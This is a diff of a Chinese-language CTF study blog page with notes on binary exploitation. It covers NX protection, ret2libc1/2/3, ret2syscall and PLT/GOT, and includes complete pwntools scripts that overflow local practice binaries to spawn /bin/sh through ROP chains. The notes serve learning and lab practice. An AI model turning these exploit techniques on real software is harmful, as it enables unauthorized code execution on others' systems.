@@ -71,6 +71,44 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-NSSRound-4-SWPU-hide-and-seek" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/07/13/NSSRound-4-SWPU-hide-and-seek/" class="article-date">
+  <time class="dt-published" datetime="2025-07-13T03:59:18.000Z" itemprop="datePublished">2025-07-13</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/07/13/NSSRound-4-SWPU-hide-and-seek/">[NSSRound#4 SWPU]hide_and_seek</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/07/13/NSSRound-4-SWPU-hide-and-seek/" data-id="cmd2qqv9w000158837ilu1xl4" data-title="[NSSRound#4 SWPU]hide_and_seek" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-HDCTF-2023-enc" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2025/07/11/HDCTF-2023-enc/" class="article-date">
@@ -146,7 +184,7 @@
       
       
       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/RC4/" rel="tag">RC4</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SMC/" rel="tag">SMC</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/TEA/" rel="tag">TEA</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/NSS/" rel="tag">NSS</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/RC4/" rel="tag">RC4</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SMC/" rel="tag">SMC</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/TEA/" rel="tag">TEA</a></li></ul>
 
     </footer>
   </div>
@@ -294,18 +332,25 @@
 <p><code>target = int(p.recvuntil(b&quot;\n&quot;,drop = True),16)</code> 接收知道读取到&#x2F;n，(输出的缓冲区的地址)，转化为十六进制整数，且<code>drop = True</code>方便地<strong>清理</strong>你接收到的数据。只提取某个模式（比如一个地址、一个数字或一个特定的字符串）而不包含用于分隔或终止的字符（如换行符、空格、冒号等）</p>
 <p><code>sc = asm(shellcraft.sh())</code>生成启动<code>/bin/sh</code>的机器码</p>
 <p><code>payload = sc+b&#39;a&#39; * (0x108 + 4-len(sc))+ p32(target)</code> 从右到左入栈，p32(target):覆盖返回地址，b’a’ * (0x108 + 4 - len(sc)):填充从sc结束位置到返回地址之间所有“无用”的栈空间。sc:当 sc位于缓冲区的起始位置。</p>
-<h2 id="rop"><a href="#rop" class="headerlink" title="rop"></a>rop</h2><h3 id="ret2libc1（单个函数的rop来链）"><a href="#ret2libc1（单个函数的rop来链）" class="headerlink" title="ret2libc1（单个函数的rop来链）"></a>ret2libc1（单个函数的rop来链）</h3><p><img src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711171739531.png" alt="image-20250711171739531"></p>
-<p>get溢出，和之前一样</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711171749636.png" alt="image-20250711171749636"></p>
-<p>system函数和bin&#x2F;sh字段都存在</p>
+<h2 id="rop"><a href="#rop" class="headerlink" title="rop"></a>rop</h2><p><strong>NX 保护 (No-Execute)</strong>: 它的<strong>唯一目的</strong>是阻止你在<strong>数据区域（比如栈和堆）执行代码</strong>。你可以把栈和堆想象成一块“只写数据，不能跑程序”的区域。</p>
+<ul>
+<li><strong>允许什么？</strong> 允许你在栈上写数据（比如填充字符串 <code>AAAA</code>，或者一些地址）。 允许你修改寄存器的值。 允许你覆盖返回地址。</li>
+<li><strong>阻止什么？</strong> 阻止你把自己的汇编代码（我们称之为 Shellcode）放在栈上，然后让程序去执行它。</li>
+</ul>
+<h3 id="ret2libc1（单个函数的rop来链）"><a href="#ret2libc1（单个函数的rop来链）" class="headerlink" title="ret2libc1（单个函数的rop来链）"></a>ret2libc1（单个函数的rop来链）</h3><p>第一步，先看保护</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250713170101689.png" alt="image-20250713170101689"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250713170137922.png" alt="image-20250713170137922"></p>
+<p>get溢出</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250713165720453.png" alt="image-20250713165720453"></p>
+<p>system函数存在,但参数不是&#x2F;bin&#x2F;sh</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250713165931741.png" alt="image-20250713165931741"></p>
+<p>system函数存在,并且程序中心存在bin&#x2F;sh字符串</p>
 <p>所以可以把bin&#x2F;sh作为参数传入system函数中构造后门函数</p>
 <p>要构造一个后门函数，先调用system函数，然后按照调用流程，参数（bin&#x2F;sh字符串所在的位置）入栈，返回地址入栈</p>
 <p>payload的形式是**[垃圾填充] + [system函数地址] + [system返回地址] + [binsh字符串地址]**</p>
 <h4 id="脚本-2"><a href="#脚本-2" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.arch = &quot;i386&quot; # 强烈建议加上这一行</span><br><span class="line">p = process(&quot;./ret2libc1&quot;)</span><br><span class="line">#gdb.attach(p,&quot;b *0x08048595&quot;) # 调试时启用</span><br><span class="line"></span><br><span class="line">#elf = ELF(&quot;./ret2libc1&quot;)</span><br><span class="line">#system = elf.plt[&quot;system&quot;]</span><br><span class="line">binsh = 0x0804A028 # 确保这个地址确实包含 &quot;/bin/sh&quot; 字符串</span><br><span class="line">p.recvuntil(b&quot;ret2libc1\n&quot;) </span><br><span class="line">payload = b&#x27;a&#x27; * (0x108 + 4)+ p32(0x080483D0)+p32(0)+p32(0x804A028)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<p>system函数地址要点击跳转位置</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711171802553.png" alt="image-20250711171802553"></p>
-<p>或者命令</p>
+<p>找到system函数位置</p>
 <p><code>elf = ELF(&quot;./ret2libc1&quot;)</code>        <code>system = elf.plt[&quot;system&quot;]</code>直接找到systemd的入口</p>
 <p><strong>注意</strong></p>
 <p>[system返回地址] 不能乱写，后门函数执行结束后会返回这个地址，错误的地址会引发崩溃</p>
@@ -321,18 +366,17 @@
 <li><strong>优点</strong>：最简单。</li>
 <li><strong>缺点</strong>：程序会崩溃，这在实际攻防中通常是不希望看到的。有时调试时为了快速验证 <code>system</code> 是否被调用，可能会暂时使用。</li>
 </ul>
-<h3 id="ret2libc2-两个函数的rop链"><a href="#ret2libc2-两个函数的rop链" class="headerlink" title="ret2libc2(两个函数的rop链)"></a>ret2libc2(两个函数的rop链)</h3><p>该题没有bin&#x2F;sh字符串</p>
+<h3 id="ret2libc2-两个函数的rop链"><a href="#ret2libc2-两个函数的rop链" class="headerlink" title="ret2libc2(两个函数的rop链)"></a>ret2libc2(两个函数的rop链)</h3><p><img src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250713170240614.png" alt="image-20250713170240614"></p>
+<p>该题没有bin&#x2F;sh字符串</p>
 <p><img src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711171815449.png" alt="image-20250711171815449"></p>
 <p>所以我们要自己去通过get构造</p>
-<p>(1)func函数通过栈溢出修改返回地址为gets_addr,传入get()的参数，a作为get函数的返回地址</p>
+<p>(1)func函数通过栈溢出修改返回地址为gets_addr,传入get()的参数，b作为get函数底色参数，即其从终端读取的数据要存入的地方</p>
 <p><img src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711171840435.png" alt="image-20250711171840435">（)</p>
 <p>（2）get函数被调用后会为自己开辟空间，执行时再次通过栈溢出填入system函数的地址和参数，最后调用system执行构造好的后门函数</p>
 <p><img src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711171859788.png" alt="image-20250711171859788"></p>
 <p>分析之后得到应该构造如下形式的payload</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711171910375.png" alt="image-20250711171910375"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711171926928.png" alt="image-20250711171926928"></p>
 <p>其中get()函数和sys函数的参数都是bss段，get()用来把bin&#x2F;sh写入bss段，sys和它构成后门函数</p>
-<p>get()的参数是它的内存地址</p>
 <p>get写入bss段的内容需要从终端读取，所以之后还要为其发送一个“bin&#x2F;sh”</p>
 <p>Payload的形式是<strong>p32（gets_addr）+p32（system_addr）+p32（gets_p1）+p32（system_p1）</strong>。</p>
 <p>开启了NX保护，写和运行不能同时实现，所以改变该函数的参数位置，所以把 <code>/bin/sh</code>）写入一个可写的内存区域。<code>.bss</code> 段是一个非常理想的选择，因为它：</p>
@@ -342,7 +386,8 @@
 <li><p>通常位于固定的地址（特别是在 <strong>没有开启 ASLR</strong> 的情况下）；</p>
 </li>
 <li><p>在程序运行期间未初始化的数据都存储在这里。</p>
-<h4 id="找bss地址"><a href="#找bss地址" class="headerlink" title="找bss地址"></a>找bss地址</h4><p>1.readelf</p>
+<p><strong>找bss地址</strong></p>
+<p>1.readelf</p>
 <p><code>readelf -S ret2libc2</code></p>
 <p><img src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711171951259.png" alt="image-20250711171951259"></p>
 <p>2.gdb调试</p>
@@ -352,10 +397,10 @@
 <p>3.脚本中直接得到</p>
 <p><code>elf.bss()</code></p>
 <p><img src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172012341.png" alt="image-20250711172012341"></p>
-<h4 id="脚本-3"><a href="#脚本-3" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&quot;./ret2libc2&quot;)</span><br><span class="line">gdb.attach(p,&quot;b *0x08048595&quot;)</span><br><span class="line">elf=ELF(&quot;./ret2libc2&quot;)</span><br><span class="line">sys=elf.plt[&quot;system&quot;]</span><br><span class="line">get=elf.plt[&quot;gets&quot;]</span><br><span class="line">bss=0x0804a040</span><br><span class="line">bss=elf.bss()</span><br><span class="line">payload=b&#x27;a&#x27;*(0x108+4)</span><br><span class="line">payload+=p32(get)+p32(sys)+p32(bss)+p32(bss)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(&quot;/bin/sh&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
+<h4 id="脚本-3"><a href="#脚本-3" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&quot;./ret2libc2&quot;)</span><br><span class="line">gdb.attach(p,&quot;b *0x08048595&quot;)</span><br><span class="line">elf=ELF(&quot;./ret2libc2&quot;)</span><br><span class="line">sys=elf.plt[&quot;system&quot;]</span><br><span class="line">get=elf.plt[&quot;gets&quot;]</span><br><span class="line">bss=elf.bss()</span><br><span class="line">payload=b&#x27;a&#x27;*(0x108+4)</span><br><span class="line">payload+=p32(get)+p32(sys)+p32(bss)+p32(bss)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(&quot;/bin/sh&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
 </ul>
 <p>gdb调试检查是否成功写入</p>
-<p>c一下运行到下断点阿位置</p>
+<p>c一下运行到下断点位置</p>
 <p><img src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172028504.png" alt="image-20250711172028504"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172042265.png" alt="image-20250711172042265"></p>
 <p>这个时候第一个get已经实现，payload已经传入了</p>
@@ -373,6 +418,7 @@
 <p>注意选取的基本原则：有几个参数就用几个pop指令，比如调用完gets函数之后，因为gets函数只有一个参数，所有可以将gets函数的返回地址改为0x0804862F，即只执行一个pop指令弹出参数之后就是ret指令；比如read函数有三个参数，那么就找0x0804862D这个位置，因为这个位置的指令是3个pop指令加上一个ret指令</p>
 <p>如何<strong>寻找若干个pop指令跟着ret指令</strong></p>
 <p><code>ROPgadget --binary ret2libc2 --only &quot;pop|ret&quot;</code></p>
+<p>(ROPgadget用于查找用来攻击的可执行代码片段，而readlf是程序的整体结构和内存布局)</p>
 <p><img src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172236929.png" alt="image-20250711172236929"></p>
 <h4 id="脚本-4"><a href="#脚本-4" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&quot;./ret2libc2&quot;)</span><br><span class="line">#gdb.attach(p,&quot;b *0x8048595&quot;)</span><br><span class="line">elf=ELF(&quot;./ret2libc2&quot;)</span><br><span class="line">sys=elf.plt[&quot;system&quot;]</span><br><span class="line">get=elf.plt[&quot;gets&quot;]</span><br><span class="line">bss=elf.bss()</span><br><span class="line">pop1_ret=0x804861b</span><br><span class="line">payload=b&#x27;a&#x27;*(0x108+4)</span><br><span class="line">payload+=p32(get)+p32(pop1_ret)+p32(bss)</span><br><span class="line">payload+=p32(sys)+p32(pop1_ret)+p32(bss)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(&quot;/bin/sh&quot;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
@@ -405,16 +451,18 @@
 </ul>
 </li>
 </ol>
-<h2 id="ret2syscall-底层系统调用"><a href="#ret2syscall-底层系统调用" class="headerlink" title="ret2syscall(底层系统调用)"></a>ret2syscall(底层系统调用)</h2><p><img src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172249291.png" alt="image-20250711172249291"></p>
+<h3 id="ret2syscall-底层系统调用静态"><a href="#ret2syscall-底层系统调用静态" class="headerlink" title="ret2syscall(底层系统调用静态)"></a>ret2syscall(底层系统调用静态)</h3><p><img src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172249291.png" alt="image-20250711172249291"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250713164900591.png" alt="image-20250713164900591"></p>
+<p>开启了NX保护，但我们可以通过精心构造ROP链实现跳转，而不改变数据段的数值</p>
 <p>除此之外没有上面有效的东西了,整个二进制文件中都没有system函数</p>
-<p>所以自己为寄存器赋值以构造后门函数。且调用的指令要放在最下面，调用时，改函数的参数必须准备好、</p>
+<p>所以自己为寄存器赋值以构造后门函数。且调用的指令要放在最下面，调用时，该函数的参数必须准备好、</p>
 <p>根据命令找到&#x2F;bin&#x2F;sh字符段 和int 0x80的调用命令以及需要的pop|ret命令</p>
 <p><img src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172303242.png" alt="image-20250711172303242"></p>
-<h3 id="脚本-5"><a href="#脚本-5" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&quot;./ret2syscall&quot;)</span><br><span class="line">#gdb.attach(p,&quot;b *0x080488ED&quot;)</span><br><span class="line">binsh=0x080ea068</span><br><span class="line">int_0x80=0x0806ce55</span><br><span class="line">pop_eax_ret = 0x080b8526</span><br><span class="line">pop_edx_ecx_ebx_ret = 0x0806f200</span><br><span class="line"></span><br><span class="line">eax = 11 # #define __NR_ execve 11</span><br><span class="line">ebx = binsh</span><br><span class="line">ecx = 0</span><br><span class="line">edx = 0</span><br><span class="line">payload=b&#x27;a&#x27;*(0x108+4)</span><br><span class="line">payload+=p32(pop_eax_ret)+p32(eax)</span><br><span class="line">payload+=p32(pop_edx_ecx_ebx_ret)+p32(edx)+p32(ecx)+p32(ebx)</span><br><span class="line">payload+=p32(int_0x80)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h4 id="脚本-5"><a href="#脚本-5" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&quot;./ret2syscall&quot;)</span><br><span class="line">#gdb.attach(p,&quot;b *0x080488ED&quot;)</span><br><span class="line">binsh=0x080ea068</span><br><span class="line">int_0x80=0x0806ce55</span><br><span class="line">pop_eax_ret = 0x080b8526</span><br><span class="line">pop_edx_ecx_ebx_ret = 0x0806f200</span><br><span class="line"></span><br><span class="line">eax = 11 # #define __NR_ execve 11</span><br><span class="line">ebx = binsh</span><br><span class="line">ecx = 0</span><br><span class="line">edx = 0</span><br><span class="line">payload=b&#x27;a&#x27;*(0x108+4)</span><br><span class="line">payload+=p32(pop_eax_ret)+p32(eax)</span><br><span class="line">payload+=p32(pop_edx_ecx_ebx_ret)+p32(edx)+p32(ecx)+p32(ebx)</span><br><span class="line">payload+=p32(int_0x80)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 
 
-<h3 id="编译知识"><a href="#编译知识" class="headerlink" title="编译知识"></a>编译知识</h3><p>（1）静态编译。编译器在编译可执行文件的时候，会提取可执行文件需要调用的对应的动态链接库（.so）中的部分，并链接到可执行文件中</p>
+<h4 id="编译知识"><a href="#编译知识" class="headerlink" title="编译知识"></a>编译知识</h4><p>（1）静态编译。编译器在编译可执行文件的时候，会提取可执行文件需要调用的对应的动态链接库（.so）中的部分，并链接到可执行文件中</p>
 <p>去，使可执行文件在运行的时候不依赖于动态链接库。</p>
 <p>（2）动态编译。动态编译的可执行文件需要附带一个动态链接库，在执行时，需要调用其对应动态链接库中的命令。所以，其优点一方面是</p>
 <p>缩小了可执行文件的大小，<strong>优点</strong>加快了编译速度，节省了系统资源。<strong>缺点</strong>一方面是哪怕很简单的程序，只要用到了链接库中的一两条命令，也要附带一个庞大的链接库；另一方面是如果其他计算机上没有安装对应的运行库，则经过动态编译的可执行文件就不能运行。</p>
@@ -436,6 +484,28 @@
 <p><img src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172348689.png" alt="image-20250711172348689"></p>
 <p>在ida中红色为外部函数，白色为内部函数</p>
 <p>静态编译的二进制文件全为内部函数</p>
+<h3 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h3><p><code>ret2libc3</code> 可以用 <code>ret2syscall</code> 的方法来攻击，只需要找到特定的、固定的 ROP gadgets 和 <code>int 0x80</code> 指令。</p>
+<p>选择 <code>ret2libc</code> 的方法，通常是因为 <code>system()</code> 函数提供的便捷性更高，虽然多了一步 <code>libc</code> 泄露的开销，但在大多数情况下，这种方法更“简单”且更“通用”。</p>
+<p>在实际的 CTF 比赛中，攻击者会根据目标程序的具体情况（是否有易于利用的 <code>int 0x80</code>、是否有足够的 gadgets、是否有 <code>&quot;/bin/sh&quot;</code> 字符串等）来选择最简单、最可靠的攻击方法。</p>
+<p><code>ret2libc</code>3 之所以需要泄露 <code>libc</code> 地址，是因为它<strong>依赖于调用 <code>libc</code> 库中</strong>（而非程序自身）的<strong>封装函数</strong>（如 <code>system()</code>），而这些 <code>libc</code> 函数的地址会受到 <strong>ASLR (地址空间布局随机化)</strong> 的影响而随机化。<code>ret2syscall</code> 能够不泄露 <code>libc</code> 地址，是因为它<strong>依赖于程序自身或加载到固定地址的共享库中</strong>的 <strong>ROP gadget</strong> 和 <strong><code>int 0x80</code> 指令</strong>，这些地址在没有 PIE (位置无关可执行文件) 的情况下是固定的。</p>
+<p>当你写了一个程序使用了 <code>libc</code> 中的函数（如 <code>printf</code>），这个函数的具体地址在编译时是未知的，因为 libc 被加载的位置会因 ASLR（地址空间布局随机化）而变化。</p>
+<table>
+<thead>
+<tr>
+<th>函数名称</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>PLT</td>
+<td>提供跳转桩代码</td>
+</tr>
+<tr>
+<td>GOT</td>
+<td>存放实际函数地址</td>
+</tr>
+</tbody></table>
+<p>当你的程序调用 <code>printf()</code> 时，实际上调用的是 PLT 中的 <code>printf@plt</code>，PLT 再通过 GOT 查找真正的地址。</p>
 <h1 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h1><h2 id="Gets"><a href="#Gets" class="headerlink" title="Gets"></a>Gets</h2><h3 id="堆栈平衡"><a href="#堆栈平衡" class="headerlink" title="堆栈平衡"></a>堆栈平衡</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#rip">rip</a></p>
 <p><img src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250705155723056.png" alt="image-20250705155723056"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/zzh202408064212/Inage/image-20250705155733566.png" alt="image-20250705155733566"></p>
@@ -599,7 +669,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tags</h3>
     <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/RC4/" rel="tag">RC4</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SMC/" rel="tag">SMC</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/TEA/" rel="tag">TEA</a></li></ul>
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/NSS/" rel="tag">NSS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RC4/" rel="tag">RC4</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SMC/" rel="tag">SMC</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/TEA/" rel="tag">TEA</a></li></ul>
     </div>
   </div>
 
@@ -609,7 +679,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/RC4/" style="font-size: 10px;">RC4</a> <a href="/tags/SMC/" style="font-size: 10px;">SMC</a> <a href="/tags/TEA/" style="font-size: 10px;">TEA</a>
+      <a href="/tags/NSS/" style="font-size: 10px;">NSS</a> <a href="/tags/RC4/" style="font-size: 10px;">RC4</a> <a href="/tags/SMC/" style="font-size: 10px;">SMC</a> <a href="/tags/TEA/" style="font-size: 10px;">TEA</a>
     </div>
   </div>
 
@@ -629,6 +699,10 @@
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2025/07/13/NSSRound-4-SWPU-hide-and-seek/">[NSSRound#4 SWPU]hide_and_seek</a>
+          </li>
         
           <li>
             <a href="/2025/07/11/HDCTF-2023-enc/">[HDCTF 2023]enc</a>
